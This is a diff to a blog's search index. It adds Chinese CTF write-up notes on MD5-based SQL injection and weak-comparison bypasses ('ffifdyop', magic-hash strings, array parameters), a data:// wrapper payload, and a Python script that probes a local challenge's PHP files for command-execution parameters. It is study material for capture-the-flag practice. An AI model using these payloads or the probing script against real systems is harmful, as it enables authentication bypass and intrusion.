@@ -1,6 +1,73 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>md5有关漏洞</title>
+    <url>/2020/08/10/md5%E6%9C%89%E5%85%B3%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="有关md5的sql漏洞"><a href="#有关md5的sql漏洞" class="headerlink" title="有关md5的sql漏洞"></a>有关md5的sql漏洞</h2><blockquote>
+<p>Hint: select * from ‘admin’ where password=md5($pass,true)</p>
+</blockquote>
+<p>我们可知道，这句sql语句本来应该是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from &#39;admin&#39; where password&#x3D;&#39;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>我们就可以思考能不能找到一个字符串，经过md5加密之后会形成<code>&#39;or&#39;xxxxx</code>或者<code>xxxxx&#39;or&#39;</code>，其中xxxxx为真。因为这样之后就会构成sql的永真搜索：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from &#39;admin&#39; where password&#x3D;&#39;&#39; or &#39;xxxxx&#39;   &#x2F;&#x2F;xxxxx为真</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后发现</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ffifdyop</span><br></pre></td></tr></table></figure>
+
+<p>经过md5可以变成</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;or&#39;6�]��!r,��b</span><br></pre></td></tr></table></figure>
+
+<p>即可成功绕过</p>
+<blockquote>
+<p>这里留下一个问题，日后可以自己写脚本看看能不能跑出类似的字符串</p>
+</blockquote>
+<h2 id="md5弱类型比较"><a href="#md5弱类型比较" class="headerlink" title="md5弱类型比较"></a>md5弱类型比较</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a &#x3D; $_GET[&#39;a&#39;];</span><br><span class="line">$b &#x3D; $_GET[&#39;b&#39;];</span><br><span class="line"></span><br><span class="line">if($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b))&#123;</span><br><span class="line">    &#x2F;&#x2F; wow, glzjin wants a girl friend.</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>看了一下有两种方法：</p>
+<ol>
+<li><p>直接数组绕过，因为数组不能md5加密，所以返回假，两者就像等了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>可以找两个字符串，他们md5加密之后都类似于“0exxxxxx”，这样根据科学计数法，二者都等于0，所以相等。【我觉着1exxxxx应该也可以】</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a&#x3D;QNKCDZO&amp;b&#x3D;s214587387a</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+]]></content>
+  </entry>
+  <entry>
+    <title>python脚本在ctf题目中的应用</title>
+    <url>/2020/08/10/python%E8%84%9A%E6%9C%AC%E5%9C%A8ctf%E9%A2%98%E7%9B%AE%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="对网页发起请求"><a href="#对网页发起请求" class="headerlink" title="对网页发起请求"></a>对网页发起请求</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">res = requests.get(payload)</span><br><span class="line">resText = res.text</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="列出文件列表"><a href="#列出文件列表" class="headerlink" title="列出文件列表"></a>列出文件列表</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">files = os.listdir(<span class="string">"D:/phpstudy_pro/WWW/src"</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="增加线程"><a href="#增加线程" class="headerlink" title="增加线程"></a>增加线程</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myThread</span> <span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, threadID, name, counter)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.threadID = threadID</span><br><span class="line">        self.name = name</span><br><span class="line">        self.counter = counter</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span>               </span><br><span class="line">        Send(self.name, self.counter)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">150</span>):</span><br><span class="line">	thread = myThread(i,i*<span class="number">20</span>,(i+<span class="number">1</span>)*<span class="number">20</span>)</span><br><span class="line">	thread.start()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h1 id="一些例子"><a href="#一些例子" class="headerlink" title="一些例子"></a>一些例子</h1><h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/src/"</span></span><br><span class="line">files = os.listdir(<span class="string">"D:/phpstudy_pro/WWW/src"</span>)  <span class="comment">#列出所有文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getGetind</span><span class="params">(fileind)</span>:</span></span><br><span class="line">	a = [];</span><br><span class="line">	fp = open(<span class="string">"D:/phpstudy_pro/WWW/src/"</span> + fileind,<span class="string">'r'</span>)</span><br><span class="line">	lines = fp.readlines()   <span class="comment">#读取文件的每一行</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> lines:</span><br><span class="line">		<span class="keyword">if</span> i.find(<span class="string">"$_GET['"</span>) &gt; <span class="number">0</span>:</span><br><span class="line">			start = i.find(<span class="string">"$_GET['"</span>) + <span class="number">7</span></span><br><span class="line">			end = i.find(<span class="string">"'"</span>,start)</span><br><span class="line">			a.append(i[start:end])   <span class="comment">#找到需要的字段</span></span><br><span class="line">	<span class="keyword">return</span> a</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> files:</span><br><span class="line">	getContent = getGetind(j)</span><br><span class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> getContent:</span><br><span class="line">		payload = url + j + <span class="string">"?"</span> + k + <span class="string">"=echo AlbatrossG"</span>   <span class="comment">#构造payload</span></span><br><span class="line">		print(payload)</span><br><span class="line">		html = requests.get(payload)    <span class="comment">#向网页发送请求</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">"AlbatrossG"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">			print(<span class="string">"Success!"</span>)</span><br><span class="line">			exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myThread</span> <span class="params">(threading.Thread)</span>:</span>   <span class="comment">#增加线程</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, threadID, name, counter)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.threadID = threadID</span><br><span class="line">        self.name = name</span><br><span class="line">        self.counter = counter</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span>               </span><br><span class="line">        Send(self.name, self.counter)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">150</span>):</span><br><span class="line">	thread = myThread(i,i*<span class="number">20</span>,(i+<span class="number">1</span>)*<span class="number">20</span>)</span><br><span class="line">	thread.start()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
     <title>文件上传</title>
     <url>/2020/08/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
     <content><![CDATA[<p>首先，先是最简单的一句话木马的上传，即没有任何阻碍：</p>
@@ -157,6 +224,17 @@
 <blockquote>
 <p>注：input2.php只充当作为地址基址的作用，使用同一目录下的input1.php也可以</p>
 </blockquote>
+<h2 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>相当于要上传一个text的文件并且内容是welcome to the zjctf</p>
+<p>于是payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</span><br></pre></td></tr></table></figure>
+
+<p>但是一般需要绕过那么就构造base64编码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>附上manual里的使用范例:</p>
+<p><img src="/2020/07/29/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/data.png" alt="data"></p>
 ]]></content>
   </entry>
   <entry>
